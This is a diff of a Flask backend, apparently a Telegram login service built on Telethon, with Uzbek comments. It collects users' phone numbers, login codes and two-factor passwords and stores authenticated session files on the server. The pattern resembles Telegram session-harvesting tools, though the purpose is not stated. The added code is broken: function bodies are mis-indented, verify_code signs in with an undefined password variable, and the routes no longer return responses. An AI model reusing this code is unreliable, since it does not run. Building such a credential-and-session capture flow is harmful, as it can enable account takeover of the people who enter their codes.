@@ -61,27 +61,25 @@ def verify_code():
         return jsonify({"status": "error", "message": "Code expired"})
 
     async def _verify():
-        client = TelegramClient(
-            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
-            API_ID,
-            API_HASH
-        )
-        await client.connect()
-        await client.sign_in(
-            phone=phone,
-            code=code,
-            phone_code_hash=phone_code_hash
-        )
-        await client.disconnect()
+    # 1️⃣ vaqtinchalik phone-session
+    temp_session = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
+    client = TelegramClient(temp_session, API_ID, API_HASH)
 
-    try:
-        asyncio.run(_verify())
-        pending_codes.pop(phone, None)
-        return jsonify({"status": "ok"})
-    except SessionPasswordNeededError:
-        return jsonify({"status": "2fa_required"})
-    except Exception:
-        return jsonify({"status": "error"})
+    await client.connect()
+    await client.sign_in(password=password)
+
+    me = await client.get_me()
+    await client.disconnect()
+
+    # 2️⃣ ASOSIY session — USER_ID bilan
+    final_session = os.path.join(SESSIONS_DIR, str(me.id))
+    client = TelegramClient(final_session, API_ID, API_HASH)
+
+    await client.connect()
+    client.session.save()
+    await client.disconnect()
+
+    return me
 
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
@@ -89,39 +87,25 @@ def verify_password():
     password = request.json.get("password")
 
     async def _verify():
-        # ❗ sessionni DARROV user_id bilan ochamiz
-        client = TelegramClient(
-            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
-            API_ID,
-            API_HASH
-        )
+    # 1️⃣ vaqtinchalik phone-session
+    temp_session = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
+    client = TelegramClient(temp_session, API_ID, API_HASH)
 
-        await client.connect()
-        await client.sign_in(password=password)
+    await client.connect()
+    await client.sign_in(password=password)
 
-        me = await client.get_me()
+    me = await client.get_me()
+    await client.disconnect()
 
-        await client.disconnect()
+    # 2️⃣ ASOSIY session — USER_ID bilan
+    final_session = os.path.join(SESSIONS_DIR, str(me.id))
+    client = TelegramClient(final_session, API_ID, API_HASH)
 
-        # 🔥 ENDI YANGI CLIENTNI USER_ID BILAN OCHAMIZ
-        client = TelegramClient(
-            os.path.join(SESSIONS_DIR, str(me.id)),
-            API_ID,
-            API_HASH
-        )
-        await client.connect()
+    await client.connect()
+    client.session.save()
+    await client.disconnect()
 
-        client.session.save()   # ❗ HECH QANDAY ARGUMENT YO‘Q
-
-        await client.disconnect()
-        return me
-
-    try:
-        me = asyncio.run(_verify())
-        return jsonify({"status": "ok"})
-
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+    return me
 
 
 @app.route("/")
